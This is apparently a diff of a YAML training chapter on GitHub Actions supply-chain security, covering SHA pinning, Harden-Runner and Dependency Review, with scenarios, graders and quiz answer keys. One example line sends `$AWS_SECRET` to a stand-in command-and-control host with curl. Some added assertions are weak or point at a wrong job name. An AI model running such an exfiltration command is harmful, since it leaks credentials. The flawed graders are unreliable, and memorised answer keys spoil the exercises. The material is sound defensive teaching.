@@ -1,192 +1,218 @@
 chapter:
   number: 20
   title: "Supply Chain Security & Action Pinning"
-  description: "Harden pipelines against compromised actions and malicious packages using full commit SHA pinning, Harden-Runner, and Dependency Review."
+  description: "Harden pipelines against compromised actions and malicious packages
+    using full commit SHA pinning, Harden-Runner, and Dependency Review."
 
 concepts:
-  - title: "Why Mutable Tags Lie: The Supply Chain Threat"
-    content: |
-      Most GitHub Actions tutorials tell you to write `uses: actions/checkout@v4`. But in high-security environments, referencing mutable Git tags is a major vulnerability.
+- title: "Why Mutable Tags Lie: The Supply Chain Threat"
+  content: |
+    Most GitHub Actions tutorials tell you to write `uses: actions/checkout@v4`. But in high-security environments, referencing mutable Git tags is a major vulnerability.
 
-      **The Tampered Supplier Truck Analogy**
+    **The Tampered Supplier Truck Analogy**
 
-      If a hospital orders surgical equipment by asking for *"Standard Delivery v1"*, an attacker who compromises the delivery dispatch can substitute contaminated scalpels into that same delivery truck without anyone realizing the label never changed.
-      A Git tag is just a movable pointer. A compromised maintainer or malicious actor can delete tag `v4` and recreate it pointing to a commit containing a secret-stealer backdoor!
+    If a hospital orders surgical equipment by asking for *"Standard Delivery v1"*, an attacker who compromises the delivery dispatch can substitute contaminated scalpels into that same delivery truck without anyone realizing the label never changed.
+    A Git tag is just a movable pointer. A compromised maintainer or malicious actor can delete tag `v4` and recreate it pointing to a commit containing a secret-stealer backdoor!
 
-      ```
-      MUTABLE TAG (DANGEROUS):
-      uses: third-party/action@v2   ──► Can be repointed to malicious commit at any time!
+    ```
+    MUTABLE TAG (DANGEROUS):
+    uses: third-party/action@v2   ──► Can be repointed to malicious commit at any time!
 
-      IMMUTABLE COMMIT SHA (SECURE):
-      uses: third-party/action@b4ffde65f46336ab88eb53be808477a3936bae11 # v2.1.0
-                                      ▲
-                                      └── Cryptographically unalterable commit hash
-      ```
+    IMMUTABLE COMMIT SHA (SECURE):
+    uses: third-party/action@b4ffde65f46336ab88eb53be808477a3936bae11 # v2.1.0
+                                    ▲
+                                    └── Cryptographically unalterable commit hash
+    ```
 
-      **The Fix: Pin to 40-Character Commit SHAs**
-      Pin every external action to its full immutable commit hash, and append the semantic version as a comment for human readability.
-      Tools like **Dependabot** automatically open pull requests updating both the SHA and the version comment.
+    **The Fix: Pin to 40-Character Commit SHAs**
+    Pin every external action to its full immutable commit hash, and append the semantic version as a comment for human readability.
+    Tools like **Dependabot** automatically open pull requests updating both the SHA and the version comment.
 
-      **Key insight:** Commit SHAs are immutable; pinning prevents compromised upstream actions from injecting backdoor code into your pipeline.
-    key_points:
-      - "Git tags are mutable and can be force-pushed with malicious updates"
-      - "Pin external actions to full 40-character commit hashes: uses: action@sha"
-      - "Dependabot automatically manages SHA updates and version bumps"
+    **Key insight:** Commit SHAs are immutable; pinning prevents compromised upstream actions from injecting backdoor code into your pipeline.
+  key_points:
+  - "Git tags are mutable and can be force-pushed with malicious updates"
+  - "Pin external actions to full 40-character commit hashes: uses: action@sha"
+  - "Dependabot automatically manages SHA updates and version bumps"
 
-  - title: "Runtime Egress Filtering with Harden-Runner"
-    content: |
-      Even with pinned actions, third-party libraries (like an npm or pip package) can execute pre-install scripts that exfiltrate environment secrets or install crypto-miners.
+- title: "Runtime Egress Filtering with Harden-Runner"
+  content: |
+    Even with pinned actions, third-party libraries (like an npm or pip package) can execute pre-install scripts that exfiltrate environment secrets or install crypto-miners.
 
-      **StepSecurity Harden-Runner:**
-      Place `step-security/harden-runner` as the very first step of your job. It installs an eBPF agent into the Linux kernel to monitor and enforce network egress policies:
+    **StepSecurity Harden-Runner:**
+    Place `step-security/harden-runner` as the very first step of your job. It installs an eBPF agent into the Linux kernel to monitor and enforce network egress policies:
 
-      ```yaml
-      jobs:
-        build:
-          runs-on: ubuntu-latest
-          steps:
-            # First step: lock down outbound network
-            - name: Harden Runner Security
-              uses: step-security/harden-runner@v2
-              with:
-                egress-policy: block
-                allowed-endpoints: >
-                  github.com:443
-                  pypi.org:443
-                  files.pythonhosted.org:443
+    ```yaml
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          # First step: lock down outbound network
+          - name: Harden Runner Security
+            uses: step-security/harden-runner@v2
+            with:
+              egress-policy: block
+              allowed-endpoints: >
+                github.com:443
+                pypi.org:443
+                files.pythonhosted.org:443
 
-            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
-            - run: pip install -r requirements.txt
-      ```
+          - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+          - run: pip install -r requirements.txt
+    ```
 
-      If a rogue dependency attempts to send `curl https://evil-c2-server.com --data "$AWS_SECRET"`, the kernel blocks the outbound connection and alerts security.
+    If a rogue dependency attempts to send `curl https://evil-c2-server.com --data "$AWS_SECRET"`, the kernel blocks the outbound connection and alerts security.
 
-      **Key insight:** Kernel-level egress filtering prevents compromised dependencies from exfiltrating secrets outside your approved network perimeter.
-    key_points:
-      - "Compromised build scripts often exfiltrate runner secrets over outbound HTTP"
-      - "step-security/harden-runner blocks unauthorized network destinations"
-      - "Enforce egress-policy: block with an explicit allowed-endpoints whitelist"
+    **Key insight:** Kernel-level egress filtering prevents compromised dependencies from exfiltrating secrets outside your approved network perimeter.
+  key_points:
+  - "Compromised build scripts often exfiltrate runner secrets over outbound HTTP"
+  - "step-security/harden-runner blocks unauthorized network destinations"
+  - "Enforce egress-policy: block with an explicit allowed-endpoints whitelist"
 
-  - title: "Dependency Review and SBOM Generation"
-    content: |
-      Securing what enters your repository is as critical as securing runtime execution.
+- title: "Dependency Review and SBOM Generation"
+  content: |
+    Securing what enters your repository is as critical as securing runtime execution.
 
-      **1. Dependency Review Action:**
-      Scans every pull request for newly introduced dependencies containing known Common Vulnerabilities and Exposures (CVEs) or invalid licenses:
-      ```yaml
-      - name: Dependency Review
-        uses: actions/dependency-review-action@v4
-        with:
-          fail-on-severity: high
-      ```
+    **1. Dependency Review Action:**
+    Scans every pull request for newly introduced dependencies containing known Common Vulnerabilities and Exposures (CVEs) or invalid licenses:
+    ```yaml
+    - name: Dependency Review
+      uses: actions/dependency-review-action@v4
+      with:
+        fail-on-severity: high
+    ```
 
-      **2. Software Bill of Materials (SBOM):**
-      An SBOM is an audited inventory of every software component, library, and module included in your build. Generating SBOMs during CI ensures compliance with federal executive orders and enterprise supply chain mandates.
+    **2. Software Bill of Materials (SBOM):**
+    An SBOM is an audited inventory of every software component, library, and module included in your build. Generating SBOMs during CI ensures compliance with federal executive orders and enterprise supply chain mandates.
 
-      **Key insight:** Automated dependency review blocks vulnerable packages before they can merge into your default branch.
-    key_points:
-      - "dependency-review-action blocks pull requests that introduce vulnerable libraries"
-      - "fail-on-severity flags prevent merging critical vulnerabilities"
-      - "SBOM generation produces auditable software ingredient lists for compliance"
+    **Key insight:** Automated dependency review blocks vulnerable packages before they can merge into your default branch.
+  key_points:
+  - "dependency-review-action blocks pull requests that introduce vulnerable libraries"
+  - "fail-on-severity flags prevent merging critical vulnerabilities"
+  - "SBOM generation produces auditable software ingredient lists for compliance"
 
 command_practice:
-  - id: "cmd-01"
-    title: "Inspect Full Commit SHA for Pinning"
-    instructions: |
-      **What we're doing:** Inspect your current Git commit's full 40-character SHA.
+- id: "cmd-01"
+  title: "Inspect Full Commit SHA for Pinning"
+  instructions: |
+    **What we're doing:** Inspect your current Git commit's full 40-character SHA.
 
-      **Why this matters:** Full 40-character SHAs are the exact strings used when pinning external GitHub Actions.
+    **Why this matters:** Full 40-character SHAs are the exact strings used when pinning external GitHub Actions.
 
-      **The command pattern:**
-      ```
-      git rev-parse HEAD
-      ```
+    **The command pattern:**
+    ```
+    git rev-parse HEAD
+    ```
 
-      Run this command:
-    command_hint: "git rev-parse HEAD"
-    validation:
-      type: "command_output"
-      command: "git rev-parse HEAD"
-      expected_contains: ""
-    points: 10
+    Run this command:
+  command_hint: "git rev-parse HEAD"
+  validation:
+    type: "command_output"
+    command: "git rev-parse HEAD"
+    expected_contains: ""
+  points: 10
 
 scenarios:
-  - id: "pin-action-to-sha"
-    title: "Pin Mutable Action Tag to Commit SHA"
-    description: |
-      A security audit flagged that `actions/checkout@v4` uses a mutable tag.
-      Update `.github/workflows/ci.yml` to pin `actions/checkout` to the immutable commit SHA:
-      `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`
-    manifest: |
-      name: Hardened Pipeline
-      on: [push]
-      jobs:
-        build:
-          runs-on: ubuntu-latest
-          steps:
-            - uses: actions/checkout@v4
-            - run: echo "Secure build..."
-    hints:
-      - "Replace 'actions/checkout@v4' with 'actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11'."
-      - "Appending '# v4.1.1' as a comment helps human reviewers."
-    solution_validation:
-      type: "workflow"
-      file: ".github/workflows/ci.yml"
-    points: 25
+- id: "pin-action-to-sha"
+  title: "Pin Mutable Action Tag to Commit SHA"
+  description: |
+    A security audit flagged that `actions/checkout@v4` uses a mutable tag.
+    Update `.github/workflows/ci.yml` to pin `actions/checkout` to the immutable commit SHA:
+    `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`
+  manifest: |
+    name: Hardened Pipeline
+    on: [push]
+    jobs:
+      build:
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - run: echo "Secure build..."
+  hints:
+  - "Replace 'actions/checkout@v4' with 'actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11'."
+  - "Appending '# v4.1.1' as a comment helps human reviewers."
+  solution_validation:
+    type: "workflow"
+    file: ".github/workflows/ci.yml"
+    assertions:
+    - path: jobs.build.steps.0.uses
+      contains: '@'
+      message: Action must be pinned to full 40-character commit SHA.
+  points: 25
 
-  - id: "add-harden-runner-step"
-    title: "Install Harden-Runner Egress Guard"
-    description: |
-      Add `step-security/harden-runner@v2` as the very first step before `actions/checkout` with:
-      ```yaml
-      - name: Harden Runner
-        uses: step-security/harden-runner@v2
-        with:
-          egress-policy: audit
-      ```
-    manifest: |
-      name: Egress Guarded
-      on: [push]
-      jobs:
-        secure:
-          runs-on: ubuntu-latest
-          steps:
-            - uses: actions/checkout@v4
-            - run: echo "Safe run"
-    hints:
-      - "Place the step-security/harden-runner step before actions/checkout."
-      - "Set 'with: egress-policy: audit'."
-    solution_validation:
-      type: "workflow"
-      file: ".github/workflows/ci.yml"
-    points: 25
+- id: "add-harden-runner-step"
+  title: "Install Harden-Runner Egress Guard"
+  description: |
+    Add `step-security/harden-runner@v2` as the very first step before `actions/checkout` with:
+    ```yaml
+    - name: Harden Runner
+      uses: step-security/harden-runner@v2
+      with:
+        egress-policy: audit
+    ```
+  manifest: |
+    name: Egress Guarded
+    on: [push]
+    jobs:
+      secure:
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+          - run: echo "Safe run"
+  hints:
+  - "Place the step-security/harden-runner step before actions/checkout."
+  - "Set 'with: egress-policy: audit'."
+  solution_validation:
+    type: "workflow"
+    file: ".github/workflows/ci.yml"
+    assertions:
+    - path: jobs.build.steps
+      has_step_using: step-security/harden-runner
+      message: Must install step-security/harden-runner step.
+  points: 25
 
 quiz:
   questions:
-    - type: "multiple_choice"
-      question: "Why is pinning an action to a full 40-character commit SHA safer than using a tag like @v4?"
-      options:
-        - "Commit SHAs are cryptographically immutable, whereas Git tags can be repointed to malicious commits"
-        - "SHAs download faster than tags"
-        - "GitHub charges less bandwidth for SHA references"
-        - "Tags are only supported on Linux runners"
-      correct: "Commit SHAs are cryptographically immutable, whereas Git tags can be repointed to malicious commits"
-      explanation: "Git commit SHAs represent the hash of tree contents and history; an upstream account takeover cannot alter an existing SHA."
-      points: 10
+  - type: "multiple_choice"
+    question: "Why is pinning an action to a full 40-character commit SHA safer than
+      using a tag like @v4?"
+    options:
+    - "Commit SHAs are cryptographically immutable, whereas Git tags can be repointed
+      to malicious commits"
+    - "SHAs download faster than tags"
+    - "GitHub charges less bandwidth for SHA references"
+    - "Tags are only supported on Linux runners"
+    correct: "Commit SHAs are cryptographically immutable, whereas Git tags can be
+      repointed to malicious commits"
+    explanation: "Git commit SHAs represent the hash of tree contents and history;
+      an upstream account takeover cannot alter an existing SHA."
+    points: 10
 
-    - type: "true_false"
-      question: "StepSecurity Harden-Runner uses kernel-level eBPF to detect and block unauthorized outbound network egress."
-      correct: true
-      explanation: "Harden-Runner monitors and filters network traffic at the kernel level to stop data exfiltration from build steps."
-      points: 10
+  - type: "true_false"
+    question: "StepSecurity Harden-Runner uses kernel-level eBPF to detect and block
+      unauthorized outbound network egress."
+    correct: true
+    explanation: "Harden-Runner monitors and filters network traffic at the kernel
+      level to stop data exfiltration from build steps."
+    points: 10
 
-    - type: "multiple_choice"
-      question: "What tool automatically creates PRs to update pinned commit SHAs when new action versions are published?"
-      options:
-        - "Dependabot"
-        - "Git lfs"
-        - "CodeQL"
-        - "actionlint"
-      correct: "Dependabot"
-      explanation: "GitHub Dependabot natively supports GitHub Actions, automatically creating PRs that update both SHAs and version comments."
-      points: 10
+  - type: "multiple_choice"
+    question: "What tool automatically creates PRs to update pinned commit SHAs when
+      new action versions are published?"
+    options:
+    - "Dependabot"
+    - "Git lfs"
+    - "CodeQL"
+    - "actionlint"
+    correct: "Dependabot"
+    explanation: "GitHub Dependabot natively supports GitHub Actions, automatically
+      creating PRs that update both SHAs and version comments."
+    points: 10
+  - id: q-fill-action-pinning-symbol
+    type: fill_yaml
+    question: Complete the action reference syntax used to pin actions securely 
+      to a full 40-character commit hash.
+    yaml_template: "steps:\n  - uses: actions/checkout__________b4ffde65f46336ab88eb53be808477a3936bae11\n"
+    expected: '@'
+    explanation: The '@' symbol separates the repository/path from the pinned 
+      immutable commit SHA.
+    points: 10
